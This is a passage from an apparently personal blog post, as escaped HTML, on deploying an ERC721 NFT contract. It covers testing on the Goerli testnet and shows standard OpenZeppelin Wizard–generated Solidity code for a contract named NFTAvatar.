forward to support additional wallets and blockchains in the future.&lt;/p&gt;\n&lt;p&gt;Once this was done, I decided to more-or-less follow the “&lt;a href=&quot;https://docs.alchemy.com/docs/how-to-develop-an-nft-smart-contract-erc721-with-alchemy&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;How to Develop an NFT Smart Contract (ERC721) with Alchemy&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;” walk-through. I’m going to skip a lot of the details here, so if you’re trying to do this yourself you should also read through that document.&lt;/p&gt;\n&lt;p&gt;I also tested deploying the smart contract and minting my NFTs on the Goerli TestNet before committing any money to deploy on the Ethereum MainNet. To do this, you’ll need to get some GoerliETH; the easiest way to do this is to create an account on &lt;a href=&quot;https://www.alchemy.com&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Alchemy&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and then visit &lt;a href=&quot;https://goerlifaucet.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the Goerli “faucet”&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, which will transfer 0.2 GoerliETH to your wallet (more than enough for what follows.&lt;/p&gt;\n&lt;p&gt;Next, go to the &lt;a href=&quot;https://docs.openzeppelin.com/contracts/4.x/wizard&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Open Zeppelin Contracts Wizard&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; to pre-generate smart contract code. I’m going to select an ERC721 contract and select the “Mintable, Autoincrement IDs”, “Enumerable”, and “URI Storage” options + uncreative contract and token names. This produces the following code.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;solidity&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;solidity&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;// SPDX-License-Identifier: MIT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;pragma&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; solidity&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; ^0.8.9&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; &quot;@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; &quot;@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; &quot;@openzeppelin/contracts/access/Ownable.sol&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; &quot;@openzeppelin/contracts/utils/Counters.sol&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;contract&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; NFTAvatar&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; is&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;ERC721Enumerable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;ERC721URIStorage&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;Ownable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;    using&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; Counters&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; for&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; Counters&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Counter&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;    Counters&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Counter &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;private&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; _tokenIdCounter&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;    constructor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;) &lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;&quot;NFTAvatar&quot;, &quot;NFTAVATAR&quot;) &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;    function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; safeMint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;address&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; string&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; memory&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; uri&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; public&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; onlyOwner&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;        uint256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; tokenId &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; _tokenIdCounter&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;current&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;        _tokenIdCounter&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;increment&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;        _safeMint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;        _setTokenURI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; uri&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;    // The following functions are overrides required by Solidity.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;    function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; _beforeTokenTransfer&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;address&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; address&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; uint256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; uint256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; batchSize&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;        internal&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;        override&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; ERC721Enumerable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;        super&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;_beforeTokenTransfer&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; batchSize&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;    function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; _burn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;uint256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; internal&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; override&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; ERC721URIStorage&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;        super&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;_burn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;    function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; tokenURI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;uint256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;        public&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;        view&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;        override&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; ERC721URIStorage&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;        returns&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;string&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; memory&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;        return&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; super&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;tokenURI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;    function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; supportsInterface&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;bytes4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; interfaceId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;        public&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;        view&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;        override&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; ERC721Enumerable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;        returns&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;bool&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;        return&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; super&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;supportsInterface&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;interfaceId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span 